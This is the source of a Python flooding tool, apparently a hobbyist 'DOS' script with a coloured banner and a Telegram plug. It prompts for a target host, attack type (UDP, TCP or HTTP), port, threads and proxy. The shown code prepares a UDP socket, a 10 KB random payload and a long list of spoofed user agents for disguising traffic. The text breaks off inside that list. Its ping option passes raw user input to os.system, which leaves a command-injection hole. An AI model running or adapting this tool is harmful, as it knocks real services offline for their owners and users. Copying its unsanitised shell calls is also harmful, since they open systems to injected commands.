import os
try :
    import sys
except : os.system('pip install sys')

try:
    from licensing.models import *
    from licensing.methods import Key, Helpers
except : os.system('pip install pip-licenses');os.system('pip install licensing')
    
print('ok')

import random



import threading
import time
import socket

try :
    import logging
except : os.system('pip install logging')

try :
    import re
except : os.system('pip install regex')


GREEN = '\033[92m'
YELLOW = '\033[93m'
RED = '\033[91m'
RESET = '\033[0m'


er1messages = [
    'Damn, Seems like something is missing, you better install it by using !pip install licensing .',
    '[x] Required Package is missing, Install it by using !pip install licensing .',
    'Buddy, you gotta have to install required thing by using !pip install licensing !!',
]

er2messages = [
    'Uh oh, looks like the server is not responding to the ping request. Please try again later.',
    'The server did not respond to the ping request. Check your internet connection and try again.',
    '[x] Server Ping request failed. Please check your network connection and try again.',
    'Sorry, we were unable to ping the server. Please try again later.',
    'Ping request to server failed. Please check your network connection and try again.'
]

er2random_message = random.choice(er2messages)

er1random_message = random.choice(er1messages)

try:
    from licensing.models import *
    from licensing.methods import Key, Helpers
except ImportError:
    print( RED + er1random_message + RESET)
    sys.exit()

from licensing.models import *
from licensing.methods import Key, Helpers



print( RED + """
 █     █░▓█████  ██▓     ▄████▄   ▒█████   ███▄ ▄███▓▓█████ 
▓█░ █ ░█░▓█   ▀ ▓██▒    ▒██▀ ▀█  ▒██▒  ██▒▓██▒▀█▀ ██▒▓█   ▀ 
▒█░ █ ░█ ▒███   ▒██░    ▒▓█    ▄ ▒██░  ██▒▓██    ▓██░▒███   
░█░ █ ░█ ▒▓█  ▄ ▒██░    ▒▓▓▄ ▄██▒▒██   ██░▒██    ▒██ ▒▓█  ▄ 
░░██▒██▓ ░▒████▒░██████▒▒ ▓███▀ ░░ ████▓▒░▒██▒   ░██▒░▒████▒
░ ▓░▒ ▒  ░░ ▒░ ░░ ▒░▓  ░░ ░▒ ▒  ░░ ▒░▒░▒░ ░ ▒░   ░  ░░░ ▒░ ░
  ▒ ░ ░   ░ ░  ░░ ░ ▒  ░  ░  ▒     ░ ▒ ▒░ ░  ░      ░ ░ ░  ░
  ░   ░     ░     ░ ░   ░        ░ ░ ░ ▒  ░      ░      ░   
    ░       ░  ░    ░  ░░ ░          ░ ░         ░      ░  ░
                        ░                                   
                       """+YELLOW+"""                                    
               |--INFORMATION--|
                """+RED+""" 
    ~ Developed by FX_PY 
    ~ Use it at your own risk 
    ~ Join our Telegram for More Tools | FX_PY 
     """+YELLOW+""" 
     
    """+RESET+""" | """+RED+""" 1 """+RESET+""": """+YELLOW+""" START DOS """+RESET+""" | 
    """+RESET+""" | """+RED+""" 2 """+RESET+""": """+YELLOW+""" START PING """+RESET+"""| 
    """+RESET+""" | """+RED+""" 0 """+RESET+""": """+YELLOW+""" SHOW HELP """+RESET+""" | 

""" + RESET )

def show_help():
    print(YELLOW + f"""
Welcome to the help section of this tool. Below is a brief description of the commands you can use:

•set-RHOST: Use this command to set the IP address or hostname of the target system you want to attack.

•set-ATTACK-TYPE: Use this command to set the type of attack you want to perform. The available options are UDP, TCP, and HTTP.

•set-RPORT: Use this command to set the port number on which the target system is listening.

•set-THREADS: Use this command to set the number of threads you want to use for the attack.

•use-PROXY: Use this command to specify whether you want to use a proxy server or not. If you want to use a proxy, enter "yes", otherwise enter "no".

•set-PROXY-IP: If you have chosen to use a proxy server, use this command to set the IP address of the proxy server.

•set-PROXY-PORT: If you have chosen to use a proxy server, use this command to set the port number of the proxy server.

Note: Please enter valid input for all the above commands. If you enter an invalid input, you will receive an error message.
""" + RESET)
    exit()


prompt = input(RED + f"rodconsole " + RESET +'> ')

if int(prompt) == 0:
    show_help()

elif int(prompt) == 2:
    def ping(host):
        response = os.system("ping " + host)
        print(response)
        if response == 0:
            return True
        else:
            return False
    
    host = input(RED + f"\u250c\u2500\u2500({os.getlogin()} @ FX )-["+ YELLOW+"set-RHOST" + RED+"]\n\u2514> " + RESET)
    timeout = int(input(RED + f"\u250c\u2500\u2500({os.getlogin()}@ FX )-["+ YELLOW+"set-Timeout Value" + RED+"]\n\u2514> " + RESET))

    print("Pinging", host, "...")
    start_time = time.time()

    ip_regex = re.compile(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}')
    match = ip_regex.search(host)
    if match:
        ip = match.group()
    else:
        ip = host

    try:
        while True:
            response = os.system(f"ping -c 1 -W {timeout} {ip}")
            if response == 0:
                print(GREEN + "Ping request succeeded" + RESET)
            else:
                print(RED + er2random_message + RESET)
            time.sleep(1)  # wait for 1 second between each ping
    except KeyboardInterrupt:
        pass

    elapsed_time = time.time() - start_time
    print(YELLOW + f"Ping complete. Elapsed time: {elapsed_time:.2f} seconds.")



elif int(prompt) == 1:
    pass

try:
    target = input(RED + f"\u250c\u2500\u2500({os.getlogin()} @ FX )-["+ YELLOW+"set-RHOST" + RED+"]\n\u2514> " + RESET)
    attack_type = input(RED + f"\u250c\u2500\u2500({os.getlogin()} @ FX )-["+ YELLOW+"set-ATTACK-TYPE" + RED+"]\n\u2514> " + RESET).upper()
    if attack_type :
        pass
    else:
        attack_type == 'UDP'
    port = int(input(RED + f"\u250c\u2500\u2500({os.getlogin()} @ FX )-["+ YELLOW+"set-RPORT" + RED+"]\n\u2514> " + RESET))
    if port :
        pass
    else:
        port == 80
        
    threads = int(input(RED + f"\u250c\u2500\u2500({os.getlogin()} @ FX )-["+ YELLOW+"set-THREADS" + RED+"]\n\u2514> " + RESET))
    if target :
        pass
    else:
        threads == int(input(RED + f"\u250c\u2500\u2500({os.getlogin()} @ FX )-["+ YELLOW+"set-THREADS" + RED+"]\n\u2514> !" + RESET))
        if threads :
            pass
        else:
            exit()
    use_proxy = input(RED + f"\u250c\u2500\u2500({os.getlogin()} @ FX )-["+ YELLOW+"use-PROXY" + RED+"]\n\u2514> " + RESET).lower() == "yes"
    proxy_ip = ""
    proxy_port = 0
    if use_proxy:
        proxy_ip = input(RED + f"\u250c\u2500\u2500({os.getlogin()} @ FX )-["+ YELLOW+"set-PROXY-IP" + RED+"]\n\u2514> " + RESET)
        proxy_port = int(input(RED + f"\u250c\u2500\u2500({os.getlogin()} @ FX )-["+ YELLOW+"set-PROXY-PORT" + RED+"]\n\u2514> " + RESET))
except ValueError:
    print("Invalid input! Please enter a valid integer.")

# set up logging

logging.basicConfig(filename='attack.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s') 

# perform DNS lookup to get target IP
if 'https://' in target :
    target=target.split('/')[2]
elif 'http://' in target :
    target=target.split('/')[2]
else :
    pass
target_ip = socket.gethostbyname(target)


print(RED + f"""
_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-""" + YELLOW +"""
Operation-Profile

|Host: {}
|Port: {}
|Threads: {}
|Ip-Address: {}
|Use-Proxy: {}
|Proxy-IP: {}
|Proxy-Port: {}
|Attack-Type: {}
""".format(target, port, threads, target_ip, use_proxy, proxy_ip, proxy_port, attack_type) + RED +"""_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_""".format(target, port, threads) + RESET)

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(10240)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.63 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:61.0) Gecko/20100101 Firefox/61.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.80 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:88.0) Gecko/20100101 Firefox/88.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/91.0.4472.77 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; SM-G986B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.116 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 Edg/91.0.864.37",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Thunderbird/78.12.0 Lightning/78.12.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0.1 Waterfox/78.13.0",
    "Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/85.0.4183.109 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/140.0.320305739 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/28.1 Mobile/15E148 Safari/605.1.15",
    "Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/133.1.339310556 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Coast/5.04.108390 Mobile/15E148 Safari/605.1.15",
    "Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Mobile/15E148 Snapchat/11.45.0.42 (like Safari/604.1)",
    "Mozilla/5.0 (iPad; CPU OS 14_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/85.0.4183.109 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 14_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/93.0.4577.78 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 14_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/142.0.326648496 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 14_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Mobile/15E148 DuckDuckGo/7 Safari/605.1.15",
    "Mozilla/5.0 (iPad; CPU OS 14_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/93.0.4577.63 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; SM-A715F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.101 Mobile Safari/537.36 GSA/11.67.11.23.arm",
    "Mozilla/5.0 (Linux; Android 10; SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A125F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/15.0 Chrome/90.0.4430.210 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-G9860) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-A715F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-A205G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.93 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-A205F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.2 Chrome/87.0.4280.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-N975U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-G781B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/15.0 Chrome/90.0.4430.210 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/15.0 Chrome/90.0.4430.82 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.2 Chrome/87.0.4280.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.2 Chrome/87.0.4280.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-N986B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/15.0 Chrome/90.0.4430.210 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 NokiaBrowser/8.5.0.191",
    "Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaN97-4/10.0.012; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/525 (KHTML, like Gecko) BrowserNG/7.1.4",
    "Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 Nokia5800d-1/31.0.101; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.9",
    "Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaE71-1/110.07.127; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413",
    "Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaE90-1/07.24.0.3; Profile/MIDP-2.0 Configuration/CLDC-1.1) AppleWebKit/413 (KHTML, like Gecko) Safari/413",
    "Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 Nokia5230/50.0.001; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.7.2",
    "Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaE5-00/042.014; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 NokiaBrowser/7.3.1.25 Mobile Safari/525",
    "Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/35.0.001; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413",
    "Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 Nokia5233/50.1.002; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 NokiaBrowser/7.3.1.26 Mobile Safari/525",
    "Mozilla/5.0 (Linux; Android 10; vivo 1904) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; vivo 1819) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.1.0; vivo 1811) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; vivo 1907) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; vivo Y30) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.1.0; vivo 1723) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.96 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; vivo 1915) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; vivo 1906) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; vivo Y51A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; vivo Y11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; vivo 1904) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.1.0; vivo 1812) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; vivo 1801) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; vivo 1935) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Mobile Safari/537.36",
    "Mozilla/5.0 (BlackBerry; U; BlackBerry 9000; en-US) AppleWebKit/532.9+ (KHTML, like Gecko) Version/5.0.0.681 Mobile Safari/532.9+",
    "Mozilla/5.0 (BlackBerry; U; BlackBerry 9000; en-US) AppleWebKit/534.8+ (KHTML, like Gecko) Version/5.0.0.822 Mobile Safari/534.8+",
    "Mozilla/5.0 (BlackBerry; U; BlackBerry 9000; en-US) AppleWebKit/533.4+ (KHTML, like Gecko) Version/4.6.0.303 Mobile Safari/533.4+",
    "Mozilla/5.0 (BlackBerry; U; BlackBerry 9000; en-US) AppleWebKit/532.2+ (KHTML, like Gecko) Version/4.5.0.153 Mobile Safari/532.2+",
    "Mozilla/5.0 (BlackBerry; U; BlackBerry 9000; en-US) AppleWebKit/525.12+ (KHTML, like Gecko) Version/4.3.0.127 Mobile Safari/525.12+",
    "Mozilla/5.0 (BlackBerry; U; BlackBerry 9000; en-US) AppleWebKit/523.15 (KHTML, like Gecko) Version/4.6.0.162 Mobile Safari/523.15",
    "Mozilla/5.0 (BlackBerry; U; BlackBerry 9000; en-US) AppleWebKit/528.15+ (KHTML, like Gecko) Version/4.5.0.187 Mobile Safari/528.15+",
    "Mozilla/5.0 (BlackBerry; U; BlackBerry 9000; en-US) AppleWebKit/532.1+ (KHTML, like Gecko) Version/4.5.0.153 Mobile Safari/532.1+",
    "Mozilla/5.0 (BlackBerry; U; BlackBerry 9000; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Version/4.6.0.234 Mobile Safari/525.13",
    "Mozilla/5.0 (BlackBerry; U; BlackBerry 9000; en-US) AppleWebKit/532.3+ (KHTML, like Gecko) Version/4.5.0.186 Mobile Safari/532.3+",
    "Mozilla/5.0 (BlackBerry; U; BlackBerry 9000; en-US) AppleWebKit/533.1+ (KHTML, like Gecko) Version/4.7.0.148 Mobile Safari/533.1+",
    "Mozilla/5.0 (BlackBerry; U; BlackBerry 9000; en-US) AppleWebKit/533.4+ (KHTML, like Gecko) Version/4.7.0.75 Mobile Safari/533.4+",
    "Mozilla/5.0 (BlackBerry; U; BlackBerry 9000; en-US) AppleWebKit/533.3+ (KHTML, like Gecko) Version/4.7.1.40 Mobile Safari/533.3+",
    "Mozilla/5.0 (BlackBerry; U; BlackBerry 9000; en-US) AppleWebKit/525.27.1 (KHTML, like Gecko) Version/3.0.0.21 Mobile Safari/525.27.1",
    "Mozilla/5.0 (BlackBerry; U; BlackBerry 9000; en-US) AppleWebKit/533.11+ (KHTML, like Gecko) Version/5.0.0.411 Mobile Safari/533.11+",
    "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0; MDDCJS)",
    "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0; EIE10;ENUSWOL)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36 OPR/41.0.2353.46",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; yie9)",
    "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0; BOIE9;ENUS)",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 OPR/45.0.2552.881",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; yie9_splug)",
    "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0; MDDRJS)",
    "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0; MATMJS)",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
    "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0; MAFSJS)",
    "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0; MAMD)",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;ENUSMSCOM)",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; yie9_splug_sk)",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)19",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 Edg/94.0.992.50",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.41 Safari/537.36 Edg/94.0.992.31",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.41 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0",
    "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36 EdgA/46.3.3.5140",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 Edg/94.0.992.50",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
